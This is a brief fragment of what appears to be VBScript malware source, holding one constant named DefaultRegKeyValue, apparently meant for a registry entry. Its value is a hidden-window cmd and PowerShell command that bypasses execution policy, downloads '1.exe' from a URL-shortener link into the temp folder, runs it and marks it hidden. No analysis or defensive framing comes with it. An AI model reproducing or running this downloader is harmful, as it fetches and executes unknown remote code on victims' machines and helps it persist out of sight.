...
Const DefaultRegKeyValue = "cmd.exe /c cd %tmp% && powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command;(new-object System.Net.WebClient).DownloadFile('https://is.gd/onorum','1.exe');./'1.exe';(get-item '1.exe').Attributes += 'Hidden';"
